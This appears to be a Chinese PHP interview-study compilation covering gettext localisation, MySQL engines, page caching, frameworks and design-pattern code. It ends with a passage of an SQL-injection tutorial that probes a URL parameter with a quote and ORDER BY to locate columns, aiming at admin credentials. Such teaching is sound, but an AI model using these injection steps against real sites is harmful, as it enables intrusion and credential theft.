这时，中国地区浏览都会在屏幕上输出“你好”，而美国地区浏览都会在屏幕上输出
“Hi”。也就是说，最终显示什么是根据你的配置文件而定的，如果找不到配置文件，
才会输出程序里面的内容。
步骤三：编码测试
1，我们在d:\www下面新建文件hi.php，详细代码如下
复制代码代码如下:

<?php
$domain = 'test';
bindtextdomain($domain, "locale/");//设置某个域的mo文件路径
textdomain($domain);//设置gettext()函数从哪个域去找mo文件
echo gettext("Hi!");//_()是gettext()函数的简写形式
?>


这时你运行改程序，只会输出“Hi”。但我们是中国人，我们不认识“Hi”，
我们只认识“你好”，这时就要配置文件出马。配置文件的生成一般借助一款工具。
下载地址：http://nchc.dl.sourceforge.net/sourceforge/gnuwin32/gettext-0.14.4.exe
安装好以后，为了在任意目录里使用，需要把“安装路径/bin”添加到系统环境变量里。
步骤四：配置文件的生成
1，我们假设你的工具已经安装好，并且可以在任意目录使用。现在就要运行cmd，并把
路径切换到d:\www下面，也就是hi.php所在目录。
键入xgettext -d hi hi.php --from-code=gb2312，然后执行，这时你可以看到新生成一个
hi.po文件，注意：--from-code=gb2312，其中gb2312还可以是utf-8。
2，打开hi.po文件，显示如下：
复制代码代码如下:

# SOME DESCRIPTIVE TITLE.
# Copyright (C) YEAR THE PACKAGE'S COPYRIGHT HOLDER
# This file is distributed under the same license as the PACKAGE package.
# FIRST AUTHOR <EMAIL@ADDRESS>, YEAR.
#
#, fuzzy
msgid ""
msgstr ""
"Project-Id-Version: PACKAGE VERSION\n"
"Report-Msgid-Bugs-To: \n"
"POT-Creation-Date: 2009-01-19 17:47+0800\n"
"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
"Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
"Language-Team: LANGUAGE <LL@li.org>\n"
"MIME-Version: 1.0\n"
"Content-Type: text/plain; charset=CHARSET\n"
"Content-Transfer-Encoding: 8bit\n"
#: hi.php:6
msgid "Hi!"
msgstr ""

现在有两个地方需要修改，
1："Content-Type: text/plain; charset=CHARSET\n"
2：msgstr ""
把1中的CHARSET修改成gb2312，然后把2修改成msgstr "你好"。
3，键入msgfmt -o hi.mo hi.po，执行，这时生成hi.mo文件。
然后在d:\www下新建locale\zh_Cn\LC_MESSAGES目录，把hi.mo拷到这里就行了。
4，现在重启apache，再次运行，屏幕上可以输出“你好”。
其他：
如果使用utft-8编码的话，需要使用
bind_textdomain_codeset($domain,'UTF-8');
相应的要把hi.po里的CHARSET改成utf-8，还需要把hi.po保存成utf-8格式，
再次生成hi.mo就行了。
总结：
我们都希望我们写的程序可以被大众甚至国际普遍使用，像大名鼎鼎的wordpress的
国际化使用的也是他。gettext还是非常不错的，简单易用，
https://www.jb51.net/article/28000.htm
```

### 数据库设计
```
https://www.cnblogs.com/xuemj/articles/6999574.html
什么是表引擎

我们看到的表结构，它的本质是数据在硬盘中的存储。根据不同的特性，数据的存储方式不同。比如：对于每一条数据，在硬盘中它是怎么存储的，怎么压缩的，怎么建立索引和优化的，它的读取和写入是怎么实现的。这些完整的一条路径，我们称之为表引擎。

选择的依据

选择的依据，是我们的需求，我们的需求很大程度上决定我们的选择。有的时候，我们的习惯决策着这个过程。这里，我们关注一下方面：

并发性，同一时间支持的写入和读取特性；

安全性，物理存储结构，异常发生时数据的是否可靠；

事务性，数据执行的颗粒，以及提供的定义原子操作的特性；

查询优化，这里我们指查询缓存和索引；

在开发上，我们主要关注：（1,3,4），在运维层面，我们关注（2）。

在表的选择上，最常用的是如下：

MyIsam

Innodb

Memory（Heap）

从案例开始

现在我们要做一个留言板，我们发现这个留言板可能有几种情况：

有很多人同时留言，同时，查看留言的人也很多；

留言的人很少，每天查看留言的人非常多；

我们的功能有留言奖励，每天前10个留言的，会有积分奖励；

我们的留言板有点像实时聊天器，对性能要求和实时性要求非常高；

MYSIAM

在5.0的时代，这个表是使用得非常普遍的，我了解的Discuz就是使用这种表。它的优势：查询速度，被很多人看重。我们看看它的一些特点：

理论上存储无限制（与操作系统的文件系统有关）

存在text/blob全文索引

索引缓存

数据压缩

低存储空间和低内存占用

高速写入

查询缓存

串行写入时，全表锁（读和写）

不支持事务

集群支持

B-Tree索引

create table a_myisam (.....) ENGINE = MYISAM;

以上特性，我们看到MyIsam主要是为查询而设计的，也是最初大家做数据存储时考虑的东西。

InnoDB 从5.1开始，InnoDB慢慢发展起来，并且成为重要数据的存储引擎。它的特点如下：

有限制的存储

索引缓存

支持事务

查询缓存

写入行锁

B-Tree索引

create table a_myisam (.....) ENGINE = InnoDB;

InnoDB更加稳定和成熟，也为更多需求提供解决方案。

Memory

查询速度快

MySQL重启后丢失

B-Tree和HASH索引

仅仅是为了快，小量数据。

A：很多人同时留言，看留言的人也很多

这意味着什么？我们的写入速度要够快且写入不影响读取。或者，我们可以并行写入。这种情况，如果我们选择MyIsam，写入量的增加会导致全表上锁，以至于读取时，要等待锁的释放；那么，显然，MyIsam会造成表性能瓶颈。这种情况，我们选择Innodb。理由如下：

Innodb写入时，锁为行锁；不影响其它写入，影响少量读（有可能大量）；

Innodb的查询性能理论上比Myisam稍差，但是非常小，可忽略；

B：留言的人很少，每天查看留言的人非常多

这个时候，选择MyIsam，没有什么问题。（读/写比较高）

C：我们的功能有留言奖励，每天前10个留言的，会有积分奖励

我们需要一些原子级别的操作，也就是在判断某条留言是前10名的时候，就将它标记，而这个标记需要原子级的：标记的过程中不允许别人查询和写入（全表锁）。这是什么意思？由于我们的操作是没有严格的前后顺序的，计算机的CPU运算分片本质是串行的。假设这个时候你有两条命令：

查询是否前10个

增加积分

假设现在已经有9个条留言了，那么这个时候来了两个请求，都查询自己是否是前10个。第一个用户查到自己是第10个，然后在它要执行第二步的时候，第11个用户来了，他也查询自己是第10个，如果没有保护机制，那么第11个也被认为是满足条件，他也会被加分。

如何实现？

一般情况下我们会增加一个字段来做标记，这个字段假设为：lock，那么更新的时候保证这个中间是没有其它操作的。我们称之为事务。

start

select ... from table where lock = 0 for update;

update table set lock = 1;

commit

D：我们的留言板有点像实时聊天器，对性能要求和实时性要求非常高

呵呵，这个不用说了，使用innodb和memory都可以。一般我们使用内存存储，会把它当做K-V来使用，根据设计的情况来选择。（不过，业内很少时候，内存的存储一般都会选择Memcache和Redis）。

总结一下

如果读/写 比很大的话，假设这个尺度为10，那么，就使用myisam（写入并发小的情况）

如果需要事务的支持，使用innodb

如果需要对并发性（写入）有要求的话，使用innodb

其它情况，可以根据实际场景选择

```

### 静态化如何实现的
https://blog.csdn.net/qq_39618306/article/details/79014438
```
这里要说的静态化指的是页面静态化，也即生成实实在在的静态文件，
也即不需要查询数据库就可以直接从文件中获取数据，
指的是真静态。它的实现方式主要有两种：
一种是我们在添加信息入库的时候就生成的静态文件，也称为模板替换技术，
这种主要用在后台，用于一些基本上很少变化的信息上，
在添加信息的时候使用添加的信息来替换制定好的模板中的内容，
达到生成静态文件的目的，这样在前台访问该信息时，
可以直接从生成好的静态文件中获取信息，如一些CMS系统。
另外一种是用户在访问我们的页面时先判断是否有对应的缓存文件存在，
如果存在就读缓存，不存在就读数据库，同时生成缓存文件。
这种实现的主要原理是基于PHP中的ob缓冲技术来实现的，
当没有静态文件时，从数据库中读取，读取的数据使用OB缓存，
使用相关的函数从OB缓冲中读取数据，写入到文件中，形成静态文件。
当然这个过程中要考虑静态文件的缓存周期问题，
我们可以根据文件的最后修改时间和当前时间及设定的缓存时间来定时更新缓存文件。
```

### 画出常见 PHP 应用架构图
```
https://www.sohu.com/a/321617933_100240362
PHP作为网络开发的强大语言之一,现在应用非常广泛，具有开放源代码，跨平台性强，开发快捷，效率高，面向对象，并且易于上手，专业专注等诸多优点。

因着这些强大的性能，PHP一度被称为“最好的语言”。PHP主要是用于WEB开发，所以各种PHP开发框架显得极为重要，它们使得程序开发变的简单有效。

1、zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。

功能非常的强大，是一个重量级的框架，ZF 用 100% 面向对象编码实现。 ZF 的组件结构独一无二，每个组件几乎不依靠其他组件。这样的松耦合结构可以让开发者独立使用组件。 我们常称此为 “use-at-will”设计。

2、Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。

Yii是一个高性能的PHP5的web应用程序开发框架。通过一个简单的命令行PHP框架工具 yiic 可以快速创建一个web应用程序的代码框架，开发者可以在生成的代码框架基础上添加业务逻辑，以快速完成应用程序的开发。



3、KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。

KYPHP已应用于许多大项目中，在同一程式中可同时管理多个数据库源，管理多个缓存，并支持复杂的目录结构。从2.1开始kyphp又极大的增强了安全性，可有效防止sql注入，xss等常见安全问题。

4、initPHP是一款轻量级的php开发框架。

采用分层体系架构，适合大中型网站架构。提供丰富的library类库，以及简单的框架扩展机制，InitPHP还提供详细的开发文档，可以让您在使用该框架的时候更加简单实用。 InitPHP实现了抽象DB层、分层体系架构、缓存无缝切换机制、简单模板机制、多模型部署机制、强大的安全体系，是快速开发php应用的利器。

5. Canphp是一个中国开源的php框架。

主要的设计理念就是为了追求简单，减少php初学者的学习成本，而且追求高效率，模版类不提供其他标签，直接应用php的源代码，还有它是微内核设计，移植性强，松散耦合等特点，能集成到你任何一个系统里面。其中集成的http类相当的强大，采集图片速度相当的快，为什么这样呢？因为适用了模拟异步多进程的原理。

6. CdvPHP 一款简单开源PHP框架，灵感来源于DX。

根据实际开发总结汇成快捷方便的轻量级框架。没有太多的硬性要求，也没有一本超厚的帮助手册。快速开发、部署、学习必备利器。

PHP作为一种服务器端的脚本语言，一般用来做网站，而PHP框架让开发变得简单起来，上述6种框架仅仅只是部分框架，六星教育选取了几个具有代表性的框架单独进行描述，希望能给正在学习PHP的同学们一些帮助。
```

## 框架篇
### ThinkPHP（TP）、CodeIgniter（CI）、Zend（非 OOP 系列）
```
http://www.sjzphp.com/webdis/php_framwork_828.html
php框架这几个一定要知道
发布时间:2019-04-08 18:23:31 来源:互联网 作者:青锋建站
　　php框架就是采用一定设计理念和架构将PHP开发组件进行封闭，并按照软件开发的过程来组织php框架结构，形成的PHP代码集。应用PHP框架进行项目开发，可以大幅度节省开发时间，统一人员合作，减少由于开发水平不统一带来的安全问题。一般PHP项目开发框架集成了这些功能：缓存，表单过滤，MVC架构，统一的数据库接口，请求分发等功能。以下是青锋建站给大家总结的最常用的几个PHP开发框架，各自有各自的特点，需要根据我们的需求来使用。青锋建站，专业致力于PHP网站建设，软件开发，SEO，网络营销，CMS建站二开发。

1、zendframwork
　　zendframwork: (ZF)是Zend公司推出的一套PHP开发框架，是PHP官方开发框架，是框架界的龙头老大。功能非常的强大，是一个重量级的框架，ZF 用 100% 面向对象编码实现。 ZF 的组件结构独一无二，每个组件几乎不依靠其他组件。这样的松耦合结构可以让开发者独立使用组件。 但是由于太庞大，如果是开发小型项目，降低速度性能。

2、Yii框架
　　Yii框架由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。Yii是一个高性能的PHP5的web应用程序开发框架。通过一个简单的命令行PHP框架工具 yiic 可以快速创建一个web应用程序的代码框架，开发者可以在生成的代码框架基础上添加业务逻辑，以快速完成应用程序的开发。

3、TP5框架
　　之所以把TP5框架放在这个位置，主要是现在国内使用太普遍了，正是由于提供了全面的中文文档支持，才拥有了大量的使用群。ThinkPHP是一个快速、简单、面向对象的轻量级PHP开发框架。遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。

4.Symfony框架
　　Symfony，是一套国外的PHP开源框架。简单的模板功能symfony是一个开源的PHP Web框架。基于最佳Web开发实践，已经有多个网站完全采用此框架开发，symfony的目的是加速Web应用的创建与维护。 它的特点如下：缓存管理 、自定义URLs、搭建了一些基础模块、多语言与I18N支持、采用对象模型与MVC分离、Ajax支持、适用于企业应用开发。

5、CodeIgniter（CI）框架
　　CodeIgniter 是一个简单快速的PHP MVC 框架。它为组织提供了足够的自由支持，允许开发人员更迅速地工作。使用 CodeIgniter 时，您不必以某种方式命名数据库表，也不必根据表命名模型。这使 CodeIgniter 成为重构遗留 PHP 应用程序的理想选择，在此类遗留应用程序中，可能存在需要移植的所有奇怪的结构。

6、CanPHP框架
　　CanPHP框架是一个简洁，实用，高效，遵循apache协议的php开源框架。它既可以完美的支持MVC模式，又可以不受限制的支持传统编程模式。它是一个轻量级的php框架，同时也是一个实用的php工具 包。以面向应用为主，不纠结于OOP，不纠结于MVC，不纠结于设计模式，不拘一格，力求简单快速优质的完成项目开发，是中小型项目开发首选。

7、Laravel 简单优雅框架
　　Laravel 是一个简单优雅的 PHP web 开发框架，将你从意大利面条式的代码中解放出来。通过简单的、表达式语法开发出很棒的 Web 应用。在Laravel中已经具有了一套高级的PHP ActiveRecord实现 -- Eloquent ORM。它能方便的将“约束（constraints）”应用到关系的双方，这样你就具有了对数据的完全控制，而且享受到ActiveRecord的所有便利。Eloquent原生支持Fluent中查询构造器（query-builder）的所有方法。

8、SlimFramework框架
　　SlimFramework是一个简单的 PHP5 框架用来创建 RESTful 的 Web 应用。可以帮助你快速编写简单功能强大的 RESTful 风格的web应用程序 和APIs。Slim很简单，可以让新手和专业人士使用。

 

9、CakePHP框架.
　　CakePHP是国外的框架，是一个运用了诸如ActiveRecord、Association Data Mapping、Front Controller和MVC等著名设计模式的快速开发框架。
该项目主要目标是提供一个可以让各种层次的PHP开发人员快速地开发出健壮的Web应用，而又不失灵活性

10、PHPUnit框架
　　PHPUnit是一个轻量级的PHP测试框架。它是在PHP5下面对JUnit3系列版本的完整移植。这个工具也可以被Xdebug扩展用来生成代码覆盖率报告 ，并且可以与phing集成来自动测试，最合它还可以和Selenium整合来完成大型的自动化集成测试。

11、KYPHP框架
　　KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。KYPHP已应用于许多大项目中，在同一程式中可同时管理多个数据库源，管理多个缓存，并支持复杂的目录结构。从2.1开始kyphp又极大的增强了安全性，可有效防止sql注入，xss等常见安全问题。

12、initPHP框架
　　initPHP是一款轻量级的php开发框架。采用分层体系架构，适合大中型网站架构。提供丰富的library类库，以及简单的框架扩展机制，InitPHP还提供详细的开发文档，可以让您在使用该框架的时候更加简单实用。 InitPHP实现了抽象DB层、分层体系架构、缓存无缝切换机制、简单模板机制、多模型部署机制、强大的安全体系，是快速开发php应用的利器。

13、SpeedPHP框架
　　SpeedPHP是一款全功能的国产PHP应用框架系统。SpeedPHP框架是从实际运行的商业系统中取其精华而成的，在稳定性和运行速度上都非常出色；同时有着清晰的架构，更有利于提高团队开发效率，教程众多，入门容易，号称最适合初学者的PHP框架，快速带你进入PHP高手的行列。
　　一般来说如果对于小型项目完全没有必要使用框架，框架集成了太多的功能组件，许多无用的功能也带进来，减慢了系统运行的速度。对于水平不高而又需要开发大型PHP项目，使用PHP框架绝对是首选。对于PHP高手，做做项目就形成了自己的框架，按照自己的习惯写的框架，符合自己特定需求，当然速度上更快，何况PHP官方也称PHP可以不依赖框架，也不推荐使用框架。
```

### Yaf、Phalcon（C 扩展系）
```
https://www.zhihu.com/question/25023032


```

### Swoole、Workerman （网络编程框架）
```
https://baijiahao.baidu.com/s?id=1608873823322214852&wfr=spider&for=pc
目前php通信服务框架最流行的有swoole与workerman俩个框架，swoole是有C语言开发的php扩展类，而workerman是纯PHP开发框架，可能swoole比workerman出名，在百度、腾讯公司都有在使用，使用频率也比较高，那么我们来看下php通信服务框架选择swoole还是workerman？


swoole是C语言开发的扩展框架，由于有着C语言的优势，swoole在内存管理、数据结构、通信协议解析明显优势于workerman，而且swoole在目前通信协议，提供更高级的通信功能，所以workerman能开发的，swoole都可以，而且功能更多，速度更快，多年的发展稳定性强。swoole也有自己的缺点，不能根据自己需要开发，而且需要PHP程序员了解底层通信服务开发，需要学习的知识比较多，swoole一般适合老手开发。


workerman是纯PHP编程语言开发，在需要的时候可以根据需求二次开发，workerman不需要了解太多通信服务，底层框架也不用学习，更不用借助PHP环境开发，可以独立运行，workerman提供完整的通信协议框架，也可以自定义开发协议，所以workerman比较适合新手PHP程序员，workerman资料文档相对来说比swoole多。workerman缺点是需要安装扩展类比较多，在高并发性能，稳定性比不上swoole。

swoole与workerman在一般项目中根本看不出来哪个比较好用，所以不是开发大型类型网站的，新手可以选择workerman提高开发速度，老手选择swoole可以证明自己的实力。

https://www.zhihu.com/question/47994137?sort=created
```

## 设计模式
### php的设计模式
```
1. ###*单例模式**
一个类在整个应用中，只有一个对象实例的设计模式
类必须自行创建这个实例
必须自行向整个系统提供这个实例
###*三私**：私有静态成员变量、构造函数、克隆函数
###*一公**：公共的静态方法

2. ###*工厂模式**
可以根据输入的参数或者应用程序配置的不同,创建一种专门用来实例化并返回其它类的实例的类

3. 观察者模式
观察者模式提供了组件之间紧密耦合的另一种方法。
该模式：一个对象通过添加一个方法（该方法允许另一个对象，即观察者注册自己）全本身变得可观察。
当可观察的对象更改时，它会将消息发送到已注册的观察者。这些观察者使用该信息执行的操作与可观察的对象无关。

4. 命令链模式：
以松散耦合主题为基础，发送消息、命令和请求，或通过一组处理程序发送任意内容。
每个处理程序都会自行判断自己能否处理请求，如果可以，该请求被处理，进程停止。

5. 策略模式：
此算法是从复杂类提取的，因而可以方便地替换。
```
```
设计模式
单例模式解决的是如何在整个项目中创建唯一对象实例的问题，工厂模式解决的是如何不通过new建立实例对象的方法。

单例模式
$_instance必须声明为静态的私有变量
构造函数和析构函数必须声明为私有,防止外部程序new 类从而失去单例模式的意义
getInstance()方法必须设置为公有的,必须调用此方法 以返回实例的一个引用
::操作符只能访问静态变量和静态函数
new对象都会消耗内存
使用场景:最常用的地方是数据库连接。
使用单例模式生成一个对象后， 该对象可以被其它众多对象所使用。
私有的__clone()方法防止克隆对象
单例模式，使某个类的对象仅允许创建一个。构造函数private修饰， 
申明一个static getInstance方法，在该方法里创建该对象的实例。如果该实例已经存在，则不创建。比如只需要创建一个数据库连接。

工厂模式
工厂模式，工厂方法或者类生成对象，而不是在代码中直接new。 
使用工厂模式，可以避免当改变某个类的名字或者方法之后，在调用这个类的所有的代码中都修改它的名字或者参数。

复制代码
 1 Test1.php
 2 <?php
 3 class Test1{
 4     static function test(){
 5         echo __FILE__;
 6     }
 7 }
 8 
 9 Factory.php
10 <?php
11 class Factory{
12     /*
13      * 如果某个类在很多的文件中都new ClassName()，那么万一这个类的名字
14      * 发生变更或者参数发生变化，如果不使用工厂模式，就需要修改每一个PHP
15      * 代码，使用了工厂模式之后，只需要修改工厂类或者方法就可以了。
16      */
17     static function createDatabase(){
18         $test = new Test1();
19         return $test;
20     }
21 }
22 
23 Test.php
24 <?php
25 spl_autoload_register('autoload1');
26 
27 $test = Factory::createDatabase();
28 $test->test();
29 function autoload1($class){
30     $dir  = __DIR__;
31     $requireFile = $dir."\\".$class.".php";
32     require $requireFile;
33 }
复制代码


注册模式
注册模式，解决全局共享和交换对象。已经创建好的对象，挂在到某个全局可以使用的数组上，在需要使用的时候，直接从该数组上获取即可。将对象注册到全局的树上。任何地方直接去访问。

复制代码
 1 <?php
 2 
 3 class Register
 4 {
 5     protected static  $objects;
 6     function set($alias,$object)//将对象注册到全局的树上
 7     {
 8         self::$objects[$alias]=$object;//将对象放到树上
 9     }
10     static function get($name){
11         return self::$objects[$name];//获取某个注册到树上的对象
12     }
13     function _unset($alias)
14     {
15         unset(self::$objects[$alias]);//移除某个注册到树上的对象。
16     }
17 }
复制代码
适配器模式
将各种截然不同的函数接口封装成统一的API。 
PHP中的数据库操作有MySQL,MySQLi,PDO三种，可以用适配器模式统一成一致，使不同的数据库操作，统一成一样的API。类似的场景还有cache适配器，可以将memcache,redis,file,apc等不同的缓存函数，统一成一致。 
首先定义一个接口(有几个方法，以及相应的参数)。然后，有几种不同的情况，就写几个类实现该接口。将完成相似功能的函数，统一成一致的方法。

复制代码
1 接口 IDatabase
2 <?php
3 namespace IMooc;
4 interface IDatabase
5 {
6     function connect($host, $user, $passwd, $dbname);
7     function query($sql);
8     function close();
9 }
复制代码
复制代码
 1 MySQL
 2 <?php
 3 namespace IMooc\Database;
 4 use IMooc\IDatabase;
 5 class MySQL implements IDatabase
 6 {
 7     protected $conn;
 8     function connect($host, $user, $passwd, $dbname)
 9     {
10         $conn = mysql_connect($host, $user, $passwd);
11         mysql_select_db($dbname, $conn);
12         $this->conn = $conn;
13     }
14 
15     function query($sql)
16     {
17         $res = mysql_query($sql, $this->conn);
18         return $res;
19     }
20 
21     function close()
22     {
23         mysql_close($this->conn);
24     }
25 }
复制代码
复制代码
 1 MySQLi
 2 <?php
 3 namespace IMooc\Database;
 4 use IMooc\IDatabase;
 5 class MySQLi implements IDatabase
 6 {
 7     protected $conn;
 8 
 9     function connect($host, $user, $passwd, $dbname)
10     {
11         $conn = mysqli_connect($host, $user, $passwd, $dbname);
12         $this->conn = $conn;
13     }
14 
15     function query($sql)
16     {
17         return mysqli_query($this->conn, $sql);
18     }
19 
20     function close()
21     {
22         mysqli_close($this->conn);
23     }
24 }
复制代码
复制代码
 1 PDO
 2 <?php
 3 namespace IMooc\Database;
 4 use IMooc\IDatabase;
 5 class PDO implements IDatabase
 6 {
 7     protected $conn;
 8     function connect($host, $user, $passwd, $dbname)
 9     {
10         $conn = new \PDO("mysql:host=$host;dbname=$dbname", $user, $passwd);
11         $this->conn = $conn;
12     }
13 function query($sql)
14     {
15         return $this->conn->query($sql);
16     }
17 
18     function close()
19     {
20         unset($this->conn);
21     }
22 }
复制代码
通过以上案例，PHP与MySQL的数据库交互有三套API，在不同的场景下可能使用不同的API，那么开发好的代码，换一个环境，可能就要改变它的数据库API，那么就要改写所有的代码，使用适配器模式之后，就可以使用统一的API去屏蔽底层的API差异带来的环境改变之后需要改写代码的问题。

策略模式
策略模式，将一组特定的行为和算法封装成类，以适应某些特定的上下文环境。 
eg：假如有一个电商网站系统，针对男性女性用户要各自跳转到不同的商品类目，并且所有的广告位展示不同的广告。在传统的代码中，都是在系统中加入各种if else的判断，硬编码的方式。如果有一天增加了一种用户，就需要改写代码。使用策略模式，如果新增加一种用户类型，只需要增加一种策略就可以。其他所有的地方只需要使用不同的策略就可以。 
首先声明策略的接口文件，约定了策略的包含的行为。然后，定义各个具体的策略实现类。

复制代码
 1 UserStrategy.php
 2 <?php
 3 /*
 4  * 声明策略文件的接口，约定策略包含的行为。
 5  */
 6 interface UserStrategy
 7 {
 8     function showAd();
 9     function showCategory();
10 }
复制代码
复制代码
 1 FemaleUser.php
 2 <?php
 3 require_once 'Loader.php';
 4 class FemaleUser implements UserStrategy
 5 {
 6     function showAd(){
 7         echo "2016冬季女装";
 8     }
 9     function showCategory(){
10         echo "女装";
11     }
12 }
复制代码
复制代码
 1 MaleUser.php
 2 <?php
 3 require_once 'Loader.php';
 4 class MaleUser implements UserStrategy
 5 {
 6     function showAd(){
 7         echo "IPhone6s";
 8     }
 9     function showCategory(){
10         echo "电子产品";
11     }
12 }
复制代码
复制代码
 1 Page.php//执行文件
 2 <?php
 3 require_once 'Loader.php';
 4 class Page
 5 {
 6     protected $strategy;
 7     function index(){
 8         echo "AD";
 9         $this->strategy->showAd();
10         echo "<br>";
11         echo "Category";
12         $this->strategy->showCategory();
13         echo "<br>";
14     }
15     function setStrategy(UserStrategy $strategy){
16         $this->strategy=$strategy;
17     }
18 }
19 
20 $page = new Page();
21 if(isset($_GET['male'])){
22     $strategy = new MaleUser();
23 }else {
24     $strategy = new FemaleUser();
25 }
26 $page->setStrategy($strategy);
27 $page->index();
复制代码
执行结果图： 





 总结： 
通过以上方式，可以发现，在不同用户登录时显示不同的内容，但是解决了在显示时的硬编码的问题。如果要增加一种策略，只需要增加一种策略实现类，然后在入口文件中执行判断，传入这个类即可。实现了解耦。 
实现依赖倒置和控制反转 （有待理解） 
通过接口的方式，使得类和类之间不直接依赖。在使用该类的时候，才动态的传入该接口的一个实现类。如果要替换某个类，只需要提供一个实现了该接口的实现类，通过修改一行代码即可完成替换。

观察者模式
1：观察者模式(Observer)，当一个对象状态发生变化时，依赖它的对象全部会收到通知，并自动更新。 
2：场景:一个事件发生后，要执行一连串更新操作。传统的编程方式，就是在事件的代码之后直接加入处理的逻辑。当更新的逻辑增多之后，代码会变得难以维护。这种方式是耦合的，侵入式的，增加新的逻辑需要修改事件的主体代码。 
3：观察者模式实现了低耦合，非侵入式的通知与更新机制。 


定义一个事件触发抽象类。

复制代码
 1 EventGenerator.php
 2 <?php
 3 require_once 'Loader.php';
 4 abstract class EventGenerator{
 5     private $observers = array();
 6     function addObserver(Observer $observer){
 7         $this->observers[]=$observer;
 8     }
 9     function notify(){
10         foreach ($this->observers as $observer){
11             $observer->update();
12         }
13     }
14 }
复制代码
定义一个观察者接口

复制代码
Observer.php
<?php
require_once 'Loader.php';
interface Observer{
    function update();//这里就是在事件发生后要执行的逻辑
}
复制代码
复制代码
 1 <?php
 2 //一个实现了EventGenerator抽象类的类，用于具体定义某个发生的事件
 3 require 'Loader.php';
 4 class Event extends EventGenerator{
 5     function triger(){
 6         echo "Event<br>";
 7     }
 8 }
 9 class Observer1 implements Observer{
10     function update(){
11         echo "逻辑1<br>";
12     }
13 }
14 class Observer2 implements Observer{
15     function update(){
16         echo "逻辑2<br>";
17     }
18 }
19 $event = new Event();
20 $event->addObserver(new Observer1());
21 $event->addObserver(new Observer2());
22 $event->triger();
23 $event->notify();
复制代码
当某个事件发生后，需要执行的逻辑增多时，可以以松耦合的方式去增删逻辑。也就是代码中的红色部分，只需要定义一个实现了观察者接口的类，实现复杂的逻辑，然后在红色的部分加上一行代码即可。这样实现了低耦合。

原型模式
原型模式（对象克隆以避免创建对象时的消耗） 
1：与工厂模式类似，都是用来创建对象。 
2：与工厂模式的实现不同，原型模式是先创建好一个原型对象，然后通过clone原型对象来创建新的对象。这样就免去了类创建时重复的初始化操作。 
3：原型模式适用于大对象的创建，创建一个大对象需要很大的开销，如果每次new就会消耗很大，原型模式仅需要内存拷贝即可。

复制代码
Canvas.php
<?php
require_once 'Loader.php';
class Canvas{
private $data;
function init($width = 20, $height = 10)
    {
        $data = array();
        for($i = 0; $i < $height; $i++)
        {
            for($j = 0; $j < $width; $j++)
            {
                $data[$i][$j] = '*';
            }
        }
        $this->data = $data;
    }
function rect($x1, $y1, $x2, $y2)
    {
        foreach($this->data as $k1 => $line)
        {
            if ($x1 > $k1 or $x2 < $k1) continue;
           foreach($line as $k2 => $char)
            {
              if ($y1>$k2 or $y2<$k2) continue;
                $this->data[$k1][$k2] = '#';
            }
        }
    }

    function draw(){
        foreach ($this->data as $line){
            foreach ($line as $char){
                echo $char;
            }
            echo "<br>;";
        }
    }
}
复制代码
复制代码
 1 Index.php
 2 <?php
 3 require 'Loader.php';
 4 $c = new Canvas();
 5 $c->init();
 6 / $canvas1 = new Canvas();
 7 // $canvas1->init();
 8 $canvas1 = clone $c;//通过克隆，可以省去init()方法，这个方法循环两百次
 9 //去产生一个数组。当项目中需要产生很多的这样的对象时，就会new很多的对象，那样
10 //是非常消耗性能的。
11 $canvas1->rect(2, 2, 8, 8);
12 $canvas1->draw();
13 echo "-----------------------------------------<br>";
14 // $canvas2 = new Canvas();
15 // $canvas2->init();
16 $canvas2 = clone $c;
17 $canvas2->rect(1, 4, 8, 8);
18 $canvas2->draw();
复制代码
执行结果：



装饰器模式
1：装饰器模式，可以动态的添加修改类的功能 
2：一个类提供了一项功能，如果要在修改并添加额外的功能，传统的编程模式，需要写一个子类继承它，并重写实现类的方法 
3：使用装饰器模式，仅需要在运行时添加一个装饰器对象即可实现，可以实现最大额灵活性。
https://www.cnblogs.com/yuanwanli/p/8796402.html
```
### 单例模式（重点）
```
```

### 工厂模式（重点）
```
```

### 观察者模式（重点）
```
```

### 依赖注入（重点）
```
```

### 装饰器模式
```
```

### 代理模式
```
```

### 组合模式
```
```

## 安全篇
### SQL 注入
### sql注入获取后台管理员账号密码
```
在完全拿下服务器主机之前，存在sql注入漏洞的网站，可能会因此提供给黑客后台管理员的账号密码，黑客登录后台后，上传木马，拿下整个主机。这是sql注入的一种应用场景。

以下讲解sql注入获取后台管理员账号密码的过程，本文以尽力对新手友好的展现过程来讲解基本原理，高手与百事通请避免观看，以免徒耗时间。

为避免读者惹上麻烦，已对原本目标网站信息进行涂抹，并提供笔者自己搭建的测试网站供有兴趣的朋友操作，换句话说，黑我的网站是合法的。

正式开始，在网站中，点击人才招聘，跳转到如下页面，同时地址栏url变为图中所示。

可以看到链接中传给服务器参数，id=2，此处逻辑一般为：服务器获取到id值为2，再通过id值返回给浏览器对应页面或内容，这个过程有可能会经过数据库。

首先惯常试试是否存在sql注入漏洞，将地址栏中的id=2更改为id=2'，即在值2后面添加单引号，回车看结果。

sweet，塔斯丁狗，服务器返回了数据库错误，并详细的打印了错误信息。由错误信息可以得知，网站使用了mysql数据库，并展示了具体的sql语句：

select ### from sy_page where 1 and id=2
这条语句表示：查询sy_page表里id为2的全部数据，而发生错误的原因则是因为多出的单引号使sql语句语法发生错误。

同时可以看出，我们只加过一个单引号'，上图错误信息却显示，实际sql语句中变为了\'反斜杠加单引号，这说明，服务器是做了特殊符号过滤的，以此来防sql注入，这确实起作用，我们便无法注入带有单引号双引号等特殊符号的语句，但其他的注入却是没问题的。

在确定存在sql注入漏洞后，对于查询语句，可以先确定查询的数据有多少列，通过如下图链接所示增加排序条件order by来探测，将地址栏中id=2改为id=2 order by 15，这将使原本的查询语句变成

select ### from sy_page where 1 and id=2 order by 15
这表示，在原来查询结果的基础上进行排序，排序的依据是第15列数据的值。

但实际结果却报错，显示不存在第15列，这正是我们追求的结果，说明查询的出数据不超过15列。

递减列数尝试，直到列数降为10時，才不再报错，如下图所示，说明数据有10列。

